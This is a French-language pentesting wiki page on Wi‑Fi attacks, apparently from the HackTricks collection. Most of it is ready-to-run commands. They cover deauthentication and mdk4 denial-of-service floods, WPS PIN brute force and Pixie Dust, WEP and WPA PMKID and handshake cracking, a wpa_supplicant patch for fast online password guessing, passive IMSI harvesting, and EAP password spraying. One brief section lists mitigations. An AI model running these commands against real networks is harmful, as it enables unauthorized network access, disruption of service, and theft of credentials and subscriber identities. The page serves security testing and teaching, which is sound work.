# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Commandes Wifi de base
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Outils

### Hijacker & NexMon (Wi‑Fi interne sur Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Exécuter airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Source : [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un template de phishing pour parvenir à obtenir le mot de passe réel du réseau ou capturer des identifiants de réseaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il fera automatiquement :

- Mettre l'interface en monitor mode
- Scanner les réseaux possibles - Et vous permettre de sélectionner la/les victime(s)
- Si WEP - Lancer des attaques WEP
- Si WPA-PSK
- Si WPS : Pixie dust attack et l'attaque bruteforce (attention, l'attaque bruteforce peut prendre beaucoup de temps). Notez qu'il n'essaie pas null PIN ni database/generated PINs.
- Tente de capturer le PMKID depuis l'AP pour le cracker
- Tente de déauthentifier les clients de l'AP pour capturer un handshake
- Si PMKID ou Handshake, tente de bruteforcer en utilisant les mots de passe top5000.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Déconnecte tout le monde (ou un ESSID/Client spécifique)
- Random fake APs -- Masquer des nets, possibilité de faire crasher des scanners
- Overload AP -- Tente de mettre hors-service l'AP (généralement pas très utile)
- WIDS -- Jouer avec l'IDS
- TKIP, EAPOL -- Quelques attaques spécifiques pour DoS certains APs
- **Cracking**
- Crack **WEP** (plusieurs outils et méthodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Utile pour capturer captive portal creds et/ou effectuer des attaques LAN
- **WPA-PSK** Evil Twin -- Utile pour des attaques réseau si vous connaissez le mot de passe
- **WPA-MGT** -- Utile pour capturer des credentials d'entreprise
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Utile pour capturer captive portal creds et/ou effectuer des attaques LAN
- **+ WPA** -- Utile pour capturer des WPA handshakes

## Open / OWE networks quick notes

- **Passive capture** sur les SSIDs ouverts fonctionne toujours avec monitor mode et tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) effectue un échange de clés par station (pas de PSK), donc les trames aéroportées sont chiffrées même sur des SSID "open". Étant basé sur WPA3, il impose aussi **802.11w PMF**, qui bloque les trames deauth/disassoc usurpées.
- OWE **n'authentifie pas** les clients : n'importe qui peut s'associer, donc **vérifiez l'isolement client** au lieu de croire les arguments marketing. Sans isolement, ARP spoofing ou poisoning de type responder sur le L2 local fonctionne toujours.
- **Evil Twin** reste réalisable sur des SSID open/OWE en présentant un signal plus fort ; PMF supprime simplement le raccourci deauth. Si les victimes acceptent un certificat TLS forgé, un MitM HTTP(S) complet est rétabli.
- Le broadcast poisoning sur le Wi‑Fi invité open permet facilement d'obtenir des creds/hashes (LLMNR/NBT-NS/mDNS). Voir :

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Description depuis** [**ici**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Les attaques de **Deauthentication**, méthode répandue dans le hacking Wi‑Fi, consistent à falsifier des trames "management" pour **déconnecter de force des appareils d'un réseau**. Ces paquets non chiffrés trompent les clients en leur faisant croire qu'ils proviennent du réseau légitime, permettant aux attaquants de collecter des WPA handshakes à des fins de cracking ou de perturber de façon persistante les connexions réseau. Cette tactique, alarmante par sa simplicité, est largement utilisée et a des implications importantes pour la sécurité des réseaux.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 signifie deauthentication
- 1 est le nombre de deauths à envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez) ; 0 signifie les envoyer en continu
- -a 00:14:6C:7E:40:80 est l'adresse MAC de l'access point
- -c 00:0F:B5:34:30:30 est l'adresse MAC du client à deauthenticate ; si ceci est omis alors une deauthentication broadcast est envoyée (ne fonctionne pas toujours)
- ath0 est le nom de l'interface

### Disassociation Packets

**Disassociation packets**, similaires aux deauthentication packets, sont un type de management frame utilisé dans les réseaux Wi‑Fi. Ces paquets servent à couper la connexion entre un appareil (comme un laptop ou un smartphone) et un access point (AP). La distinction principale entre disassociation et deauthentication réside dans leurs scénarios d'utilisation. Tandis qu'un AP émet **deauthentication packets pour retirer explicitement les rogue devices du réseau, disassociation packets sont généralement envoyés lorsque l'AP subit un arrêt**, redémarrage ou déplacement, nécessitant ainsi la déconnexion de tous les nœuds connectés.

**Cette attaque peut être effectuée par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Voir** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envoie des beacon frames pour afficher de faux APs aux clients. Cela peut parfois faire planter les network scanners et même les drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Envoyer des authentication frames à tous les Access Points (APs) accessibles à portée peut surcharger ces APs, surtout lorsque de nombreux clients sont impliqués. Ce trafic intense peut entraîner une instabilité du système, provoquant le gel ou même le redémarrage de certains APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Le Probing des Access Points (APs) vérifie si un SSID est correctement révélé et confirme la portée de l'AP. Cette technique, couplée avec **bruteforcing hidden SSIDs** avec ou sans wordlist, aide à identifier et accéder aux réseaux dissimulés.

**ATTACK MODE m: Michael Countermeasures Exploitation**

L'envoi de paquets aléatoires ou dupliqués vers différentes queues QoS peut déclencher Michael Countermeasures sur **TKIP APs**, entraînant une mise hors service de l'AP pendant une minute. Cette méthode est une tactique d'attaque **DoS** (Denial of Service) efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inonder un AP avec des **EAPOL Start frames** crée des **fausses sessions**, submerge l'AP et bloque les clients légitimes. Alternativement, l'injection de **faux EAPOL Logoff messages** déconnecte de force les clients ; les deux méthodes perturbent efficacement le service réseau.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attaques pour les réseaux maillés IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les réseaux maillés.

**ATTACK MODE w: Confusion de WIDS**

La connexion croisée de clients à plusieurs nœuds WDS ou à de faux rogue APs peut manipuler les systèmes de détection et de prévention d'intrusions, créant de la confusion et permettant un abus potentiel du système.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer offrant diverses sources de paquets et un ensemble complet de modificateurs pour la manipulation des paquets.

### **Airggedon**

_**Airgeddon**_ propose la plupart des attaques présentées dans les commentaires précédents :

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifie le processus de connexion des appareils à un routeur, accélérant et facilitant la configuration pour les réseaux chiffrés avec **WPA** ou **WPA2** Personal. Il est inefficace contre la sécurité WEP, facilement compromise. WPS utilise un PIN de 8 chiffres, validé en deux moitiés, le rendant vulnérable aux attaques brute-force en raison du nombre limité de combinaisons (11,000 possibilités).

### WPS Bruteforce

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

- **Reaver** a été conçu comme une attaque robuste et pratique contre WPS, et a été testé sur une grande variété d'access points et d'implémentations WPS.
- **Bully** est une **nouvelle implémentation** de l'attaque WPS brute-force, écrite en C. Il présente plusieurs avantages par rapport au code original de Reaver : moins de dépendances, meilleures performances mémoire et CPU, gestion correcte de l'endianness, et un ensemble d'options plus robuste.

L'attaque exploite la vulnérabilité du WPS PIN, notamment l'exposition des quatre premiers chiffres et le rôle du dernier chiffre en tant que checksum, ce qui facilite l'attaque brute-force. Cependant, des défenses contre les attaques brute-force, comme le blocage des adresses MAC des attaquants agressifs, exigent une rotation des adresses MAC pour poursuivre l'attaque.

Une fois le WPS PIN obtenu avec des outils comme Bully ou Reaver, l'attaquant peut déduire le PSK WPA/WPA2, assurant un accès réseau persistant.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Cette approche affinée cible les WPS PINs en exploitant des vulnérabilités connues :

1. **Pre-discovered PINs**: Utilisez une base de données de PINs connus liée à des fabricants spécifiques qui ont tendance à utiliser des WPS PINs uniformes. Cette base de données met en corrélation les trois premiers octets des MAC-addresses avec les PINs probables pour ces fabricants.
2. **PIN Generation Algorithms**: Exploitez des algorithmes comme ComputePIN et EasyBox, qui calculent les WPS PINs à partir du MAC-address de l'AP. L'algorithme Arcadyan exige en plus un device ID, ajoutant une couche au processus de génération des PINs.

### WPS Pixie Dust attack

**Dominique Bongard** a découvert une faille dans certains points d'accès (APs) concernant la création de codes secrets, appelés **nonces** (**E-S1** et **E-S2**). Si ces nonces peuvent être déterminés, le cracking du WPS PIN de l'AP devient facile. L'AP révèle le PIN dans un code spécial (hash) pour prouver qu'il est légitime et non un AP rogue. Ces nonces sont essentiellement les "clés" pour ouvrir le "coffre" qui contient le WPS PIN. Plus d'informations à ce sujet sont disponibles [ici](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En termes simples, le problème est que certains APs n'utilisaient pas des clés suffisamment aléatoires pour chiffrer le PIN pendant le processus de connexion. Cela permet de deviner le PIN depuis l'extérieur du réseau (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si vous ne souhaitez pas passer l'appareil en monitor mode, ou si `reaver` et `bully` rencontrent des problèmes, vous pouvez essayer [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Cet outil peut effectuer une Pixie Dust attack sans avoir à passer en monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Quelques systèmes mal conçus laissent même un **Null PIN** (un PIN vide ou inexistant) permettre l'accès, ce qui est assez inhabituel. L'outil **Reaver** est capable de tester cette vulnérabilité, contrairement à **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 vous permettent d'essayer **votre PIN personnalisé** (si vous en avez)
- 7 and 8 effectuent la **Pixie Dust attack**
- 13 vous permet de tester le **NULL PIN**
- 11 and 12 vont **récupérer les PINs liés à l'AP sélectionnée depuis les bases de données disponibles** et **générer** des **PINs** possibles en utilisant : ComputePIN, EasyBox et éventuellement Arcadyan (recommandé, pourquoi pas ?)
- 9 and 10 testeront **tous les PINs possibles**

## **WEP**

**Pourquoi il s'effondre**

- RC4 seed is just **IV (24 bits) + shared key**. The IV is cleartext, tiny (2^24), and repeats quickly, so ciphertexts with the same IV reuse the keystream.
- XORing deux ciphertexts avec le même keystream leaks `PlaintextA ⊕ PlaintextB`; les en-têtes prévisibles + les biais RC4 KSA (**FMS**) vous permettent de « voter » les octets de la clé. **PTW** optimise cela en utilisant le trafic ARP pour réduire les besoins à des dizaines de milliers de paquets au lieu de millions.
- L'intégrité n'est que **CRC32** (linéaire/sans clé), donc un attaquant peut inverser des bits et recalculer CRC32 sans la clé → packet forgery/replay/ARP injection en attendant les IVs.

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon propose encore un workflow WEP "All-in-One" si vous préférez une interface guidée.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) une nouvelle méthode d'attaque, unique car elle ne nécessite **qu'un seul paquet** et n'exige pas que des clients soient connectés à l'AP cible — seulement une interaction entre l'attaquant et l'AP.

Beaucoup de routeurs modernes ajoutent un **champ optionnel** à la **première trame EAPOL** lors de l'association, connu sous le nom de `Robust Security Network`. Celui-ci inclut le `PMKID`.

Comme l'explique le post original, le **PMKID** est créé en utilisant des données connues :
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Étant donné que le "PMK Name" est constant, que nous connaissons le BSSID de l'AP et la station, et que le `PMK` est identique à celui d'un full 4-way handshake, **hashcat** peut utiliser ces informations pour crack le PSK et récupérer la passphrase !

Pour **gather** ces informations et **bruteforce** localement le mot de passe vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs capturés** seront affichés dans la **console** et aussi **enregistrés** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et craquez-la :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format d'un hash correct contient **4 parties**, comme : `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si le vôtre ne contient **que** **3 parties**, alors, il est **invalide** (la capture PMKID n'était pas valide).

Notez que `hcxdumptool` **capture également des handshakes** (quelque chose comme ceci apparaîtra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pouvez **transformer** les **handshakes** au format **hashcat**/**john** en utilisant `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqué que certains handshakes capturés avec cet outil n'ont pas pu être cracked même en connaissant le mot de passe correct. Je recommande de capturer des handshakes aussi de manière traditionnelle si possible, ou d'en capturer plusieurs avec cet outil._

### Capture de handshake

Une attaque contre des réseaux **WPA/WPA2** peut être réalisée en capturant un **handshake** et en tentant de **crack** le mot de passe **offline**. Ce processus implique la surveillance des communications d'un réseau spécifique et du **BSSID** sur un **channel** particulier. Voici un guide simplifié :

1. Identifiez le **BSSID**, le **channel**, et un **connected client** du réseau cible.
2. Utilisez `airodump-ng` pour surveiller le trafic réseau sur le **channel** et le **BSSID** spécifiés, en espérant capturer un **handshake**. La commande ressemblera à ceci :
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Pour augmenter les chances de capturer un handshake, déconnectez momentanément le client du réseau pour forcer une ré-authentification. Cela peut être fait en utilisant la commande `aireplay-ng`, qui envoie des deauthentication packets au client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Notez que, comme le client a été deauthenticated, il pourrait essayer de se connecter à un autre AP ou, dans d'autres cas, à un autre réseau._

Une fois que des informations de handshake apparaissent dans `airodump-ng`, cela signifie que le handshake a été capturé et vous pouvez arrêter d'écouter :

![](<../../images/image (172) (1).png>)

Une fois le handshake capturé, vous pouvez le **crack** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Vérifier si un handshake est présent dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve un handshake incomplet d'un ESSID avant le handshake complet, il ne détectera pas le handshake valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Deviner des PSK en ligne plus rapidement via la socket de contrôle de `wpa_supplicant` (sans clients/PMKID)

Quand aucun client n'est présent et que l'AP refuse PMKID, vous pouvez itérer des PSK en ligne sans relancer les supplicants :

- Modifiez `wpa_supplicant.c` pour forcer `dur = 0;` dans la logique de backoff des échecs d'authentification (autour de `ssid->auth_failures`), désactivant ainsi la minuterie de désactivation temporaire.
- Lancez un seul daemon avec une socket de contrôle :
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Pilotez-le via l'interface de contrôle, en réutilisant le même scan et le même réseau :
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Une petite boucle Python lisant les événements socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) peut tester ~100 essais en ~5 minutes sans la surcharge de scan. Elle reste toutefois bruyante et détectable, mais évite les redémarrages de processus à chaque tentative et les délais de backoff.

## **WPA Enterprise (MGT)**

Dans **les environnements WiFi d'entreprise, vous rencontrerez diverses méthodes d'authentification**, chacune offrant différents niveaux de sécurité et des fonctionnalités de gestion. Lorsque vous utilisez des outils comme `airodump-ng` pour inspecter le trafic réseau, vous pouvez remarquer des identifiants pour ces types d'authentification. Parmi les méthodes courantes figurent :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Cette méthode prend en charge les hardware tokens et les one-time passwords au sein d'EAP-PEAP. Contrairement à MSCHAPv2, elle n'utilise pas de peer challenge et envoie les passwords en texte clair à l'access point, ce qui pose un risque pour les attaques de downgrade.
2. **EAP-MD5 (Message Digest 5)**:
- Implique l'envoi du hash MD5 du password depuis le client. Ce n'est **pas recommandé** en raison de sa vulnérabilité aux attaques par dictionnaire, de l'absence d'authentification du serveur, et de l'incapacité à générer des clés WEP spécifiques à la session.
3. **EAP-TLS (Transport Layer Security)**:
- Utilise des certificats côté client et côté serveur pour l'authentification et peut générer dynamiquement des clés WEP basées utilisateur et basées session pour sécuriser les communications.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fournit une authentification mutuelle via un tunnel chiffré, ainsi qu'une méthode pour dériver des clés WEP dynamiques, par utilisateur et par session. Il ne nécessite que des certificats côté serveur, les clients utilisant des credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Fonctionne de manière similaire à EAP en créant un tunnel TLS pour la communication protégée. Il permet l'utilisation de protocoles d'authentification plus faibles au-dessus d'EAP grâce à la protection offerte par le tunnel.
- **PEAP-MSCHAPv2** : Souvent appelé PEAP, il combine le mécanisme vulnérable challenge/response de MSCHAPv2 avec un tunnel TLS protecteur.
- **PEAP-EAP-TLS (or PEAP-TLS)** : Semblable à EAP-TLS mais initie un tunnel TLS avant l'échange de certificats, offrant une couche de sécurité supplémentaire.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture du nom d'utilisateur

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) il semble que si vous utilisez **EAP** les messages **"Identity"** doivent être **supportés**, et le **nom d'utilisateur** va être envoyé en **clair** dans les messages **"Response Identity"**.

Même en utilisant l'une des méthodes d'authentification les plus sûres : **PEAP-EAP-TLS**, il est possible de **capturer le nom d'utilisateur envoyé dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentication** (lancez `airodump-ng` sur un canal et `wireshark` sur la même interface) et filtrez les paquets par `eapol`.\
Dans le paquet "**Response, Identity**", le **nom d'utilisateur** du client apparaîtra.

![](<../../images/image (850).png>)

### Identités anonymes

Le masquage d'identité est pris en charge à la fois par EAP-PEAP et EAP-TTLS. Dans le contexte d'un réseau WiFi, une requête EAP-Identity est typiquement initiée par l'access point (AP) pendant le processus d'association. Pour assurer la protection de l'anonymat des utilisateurs, la réponse du client EAP sur l'appareil de l'utilisateur contient seulement les informations essentielles nécessaires au serveur RADIUS initial pour traiter la requête. Ce concept est illustré par les scénarios suivants :

- EAP-Identity = anonymous
- Dans ce scénario, tous les utilisateurs emploient le pseudonyme "anonymous" comme identifiant utilisateur. Le serveur RADIUS initial fonctionne soit comme un serveur EAP-PEAP soit comme un serveur EAP-TTLS, responsable de la gestion du côté serveur du protocole PEAP ou TTLS. La méthode d'authentification interne (protégée) est ensuite soit traitée localement soit déléguée à un serveur RADIUS distant (home).
- EAP-Identity = anonymous@realm_x
- Dans cette situation, les utilisateurs de différents realms dissimulent leur identité tout en indiquant leur realm respectif. Cela permet au serveur RADIUS initial de proxyfier les requêtes EAP-PEAP ou EAP-TTLS vers les serveurs RADIUS de leurs home realms, qui agissent comme serveur PEAP ou TTLS. Le serveur RADIUS initial opère uniquement comme nœud relais RADIUS.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

Dans EAP-PEAP, une fois le tunnel TLS établi entre le serveur PEAP et le client PEAP, le serveur PEAP initie une requête EAP-Identity et la transmet à travers le tunnel TLS. Le client répond à cette seconde requête EAP-Identity en envoyant, par le tunnel chiffré, une EAP-Identity response contenant la véritable identité de l'utilisateur. Cette approche empêche efficacement la révélation de la véritable identité de l'utilisateur à quiconque écoute passivement le trafic 802.11.

EAP-TTLS suit une procédure légèrement différente. Avec EAP-TTLS, le client s'authentifie typiquement en utilisant PAP ou CHAP, sécurisé par le tunnel TLS. Dans ce cas, le client inclut un attribut User-Name et soit un attribut Password soit un attribut CHAP-Password dans le message TLS initial envoyé après l'établissement du tunnel.

Quel que soit le protocole choisi, le serveur PEAP/TTLS obtient la connaissance de la véritable identité de l'utilisateur après l'établissement du tunnel TLS. La véritable identité peut être représentée comme user@realm ou simplement user. Si le serveur PEAP/TTLS est également responsable de l'authentification de l'utilisateur, il possède désormais l'identité de l'utilisateur et poursuit avec la méthode d'authentification protégée par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transférer une nouvelle requête RADIUS vers le serveur RADIUS home de l'utilisateur. Cette nouvelle requête RADIUS omet la couche protocolaire PEAP ou TTLS. Dans les cas où la méthode d'authentification protégée est EAP, les messages EAP internes sont transmis au serveur RADIUS home sans l'encapsulation EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la véritable identité de l'utilisateur, remplaçant le User-Name anonymous de la requête RADIUS entrante. Lorsque la méthode d'authentification protégée est PAP ou CHAP (supportée uniquement par TTLS), le User-Name et les autres attributs d'authentication extraits de la charge utile TLS sont substitués dans le message RADIUS sortant, remplaçant le User-Name anonymous et les attributs TTLS EAP-Message trouvés dans la requête RADIUS entrante.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Cliquez pour développer</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Remarques :
- Fonctionne avant tout tunnel TLS si le déploiement utilise un EAP‑SIM/AKA nu sans identité protégée/pseudonymes.
- La valeur exposée est un identifiant permanent lié à la SIM de l'abonné ; sa collecte permet le suivi à long terme et des abus télécoms en aval.

Impact
- Confidentialité : suivi persistant des utilisateurs/appareils à partir de captures Wi‑Fi passives dans des lieux publics.
- Démarrage d'abus télécoms : avec l'IMSI, un attaquant disposant d'un accès SS7/Diameter peut interroger la localisation ou tenter l'interception d'appels/SMS et le vol de MFA.

Mitigations / what to look for
- Vérifier que les clients utilisent des identités externes anonymes (pseudonymes) pour EAP‑SIM/AKA conformément aux recommandations 3GPP (p.ex., 3GPP TS 33.402).
- Privilégier le tunneling de la phase d'identité (p.ex., EAP‑TTLS/PEAP transportant en interne EAP‑SIM/AKA) afin que l'IMSI ne soit jamais envoyé en clair.
- Les captures de paquets d'association/authentification ne devraient jamais révéler un IMSI brut dans EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Si le client est censé utiliser un **username and password** (notez que **EAP-TLS ne sera pas valide** dans ce cas), vous pouvez essayer d'obtenir une **liste** de **usernames** (voir la partie suivante) et de **passwords**, puis tenter de **bruteforce** l'accès en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer).
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pouvez également effectuer cette attaque en utilisant `eaphammer` :
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
